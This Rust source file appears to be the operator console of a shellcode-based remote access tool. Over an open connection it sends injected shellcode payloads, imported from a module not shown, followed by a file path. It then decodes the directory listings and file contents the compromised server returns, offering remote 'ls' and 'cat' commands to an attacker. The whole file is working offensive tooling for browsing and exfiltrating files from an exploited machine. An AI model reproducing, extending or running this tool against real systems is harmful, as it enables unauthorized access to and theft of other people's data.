use std::{io::{self, Write, Read}, error::Error, net::Shutdown};

use colored::Colorize;
use errno::Errno;

use crate::{util::print_error, config::Config, shellcode::{SYS_OPEN_DIR_SENDER, SYS_OPEN_CAT_SENDER}};

fn dir(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    // Maximum file length is 256
    let dir_sender = SYS_OPEN_DIR_SENDER;
    let mut dir_shellcode = dir_sender.shellcode.to_vec();
    dir_shellcode.extend(file.as_bytes());
    dir_shellcode.push(0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&dir_shellcode)?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);

    if beacon < 0 {
        let e = -beacon;
        let message = format!("ls: cannot access '{}': {}", file, Errno(e as i32));
        return Err(message.into());
    }

    let struct_len = beacon as u64;
    let mut index: u64 = 0;

    while index < struct_len {
        /* inode not important here */
        let mut _d_ino_buff = [0; 8];
        conn.read_exact(&mut _d_ino_buff)?;
        let _d_ino = u64::from_le_bytes(_d_ino_buff);

        /* d_off not important here */
        let mut _d_off_buff = [0; 8];
        conn.read_exact(&mut _d_off_buff)?;
        let _d_off = u64::from_le_bytes(_d_off_buff);
        
        let mut d_reclen_buff = [0; 2];
        conn.read_exact(&mut d_reclen_buff)?;
        let d_reclen = u16::from_le_bytes(d_reclen_buff);

        let mut file_name_buff = vec![0; (d_reclen - 0x13) as usize];
        conn.read_exact(&mut file_name_buff)?;

        /* Remove redundant null bytes */
        file_name_buff = file_name_buff.into_iter().take_while(|&x| x != 0).collect();

        let file_name = match String::from_utf8(file_name_buff) {
            Ok(name) => {
                name
            },
            Err(_) => {
                "?".to_string()
            }
        };

        let mut d_type_buff = [0; 1];
        conn.read_exact(&mut d_type_buff)?;
        let d_type = u8::from_le_bytes(d_type_buff);

        let file_name_colored = match d_type {
            0 => { // DT_UNKNOWN
                file_name
            }
            1 => { // DT_FIFO
                file_name.yellow().on_black().to_string()
            },
            2 => { // DT_CHR
                file_name.yellow().bold().to_string()
            },
            4 => { // DT_DIR
                file_name.blue().bold().to_string()
            },
            6 => { // DT_BLK
                file_name.yellow().bold().to_string()
            },
            8 => { // DT_REG
                file_name
            },
            10 => { // DT_LNK
                file_name.cyan().bold().to_string()
            }
            12 => { // DT_SOCK
                file_name.magenta().bold().to_string()
            },
            14 => { // DT_WHT
                file_name
            },
            _ => {
                file_name
            }
        };

        println!("{}", file_name_colored);

        index += d_reclen as u64;
    }

    Ok(())
}

fn cat(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let cat_sender = SYS_OPEN_CAT_SENDER;
    let mut cat_shellcode = cat_sender.shellcode.to_vec();
    cat_shellcode.extend(file.as_bytes());
    cat_shellcode.push(0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&cat_shellcode)?;

    let mut beacon_buff = [0; 8];
    let mut file_content_buff = Vec::new();
    loop {
        conn.read_exact(&mut beacon_buff)?;
        let beacon = i64::from_le_bytes(beacon_buff);
        if beacon == 0 {
            break;
        }
        if beacon < 0 {
            let e = -beacon;
            let message = format!("cat: cannot access '{}': {}", file, Errno(e as i32));
            return Err(message.into());
        }
        let chunk_len = beacon as u64;
        let mut chunk_buff = vec![0; chunk_len as usize];
        conn.read_exact(&mut chunk_buff)?;
        file_content_buff.extend(chunk_buff);
    }

    let file_content = String::from_utf8_lossy(&file_content_buff);
    println!("{}", file_content);

    Ok(())
}

fn help() {
    println!(
        "
    Core Commands
    =============

        Command       Syscall       Description
        -------       -------       -----------
        ls [DIR]      List directory
        dir [DIR]     List directory
        cat [FILE]    Print File Content
        exit          Exit shell
"
    ); 
}

fn exit(config: &mut Config) -> Result<bool, Box<dyn Error>> {
    let stdin = io::stdin();
    loop {
        let mut line = String::new();
        let quote = "Exit server? y) n) ".bold();
        println!("{}", quote);
        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read != 0 {
            let first_char = line.chars().nth(0).unwrap();
            if first_char == 'y' {
                config.conn.as_ref().unwrap().shutdown(Shutdown::Both)?;
                config.conn = None;
                return Ok(true);
            } else if first_char == 'n' {
                return Ok(false);
            }
        }
    }
}

pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
    let ps = "$ ".bold();

    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();

    loop {
        let mut line = String::new();

        write!(stdout_handle, "{}", ps)?;
        stdout_handle.flush()?;

        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read == 0 {
            match exit(config) {
                Ok(want_exit) => {
                    if want_exit {
                        break;
                    }
                },
                Err(err) => {
                    let message = format!("Error: {}", err);
                    print_error(&message);
                }
            }
            continue;
        }
        let mut iter = line.trim().split_whitespace();
        if let Some(command) = iter.next() {
            match command {
                "help" => {
                    help();
                },
                "ls" | "dir" => {
                    let file = match iter.next() {
                        Some(f) => f,
                        None => ".",
                    };
                    if let Err(err) = dir(config, file) {
                        let message = format!("Error: {}", err);
                        print_error(&message);
                    }
                },
                "cat" | "type" => {
                    if let Some(f) = iter.next() {
                        if let Err(err) = cat(config, f) {
                            let message = format!("Error: {}", err);
                            print_error(&message);
                        }
                    } else {
                        print_error("Error: cat: no file specified")
                    }
                },
                "exit" => {
                    match exit(config) {
                        Ok(want_exit) => {
                            if want_exit {
                                break;
                            }
                        },
                        Err(err) => {
                            let message = format!("Error: {}", err);
                            print_error(&message);
                        }
                    }
                },
                _ => {
                    let message = format!("Unknown command '{}'", command);
                    print_error(&message);
                    help();
                }
            };
        } else {
            help();
        }
    }

    println!("");
    Ok(())
}
